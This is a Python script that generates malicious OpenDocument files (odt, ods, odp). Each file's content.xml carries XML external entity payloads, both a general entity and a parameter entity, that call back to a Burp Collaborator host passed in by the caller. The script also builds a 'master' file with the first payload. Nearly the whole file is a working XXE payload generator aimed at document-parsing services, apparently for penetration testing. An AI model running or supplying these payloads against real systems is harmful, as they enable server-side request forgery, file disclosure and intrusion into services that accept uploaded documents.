from pathlib import Path
import zipfile
import tempfile

def generate_office_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    extensions = {
        'odt': ('office:document', 'office:text'),
        'ods': ('office:document', 'office:spreadsheet'),
        'odp': ('office:document', 'office:presentation'),
    }
    
    for ext, (root_ns, body_ns) in extensions.items():
        ext_dir = output_dir / ext
        ext_dir.mkdir(parents=True, exist_ok=True)
        
        xxe_dir = ext_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
        
        odt_xxe1_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-{ext}-1">
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>test</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = xxe_dir / f"xxe1_doctype.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xxe1_doctype)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_xxe2_parameter = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-{ext}-2">
%xxe;
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>test</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = xxe_dir / f"xxe2_parameter.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xxe2_parameter)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        master_file = ext_dir / f"master.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xxe1_doctype)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(master_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
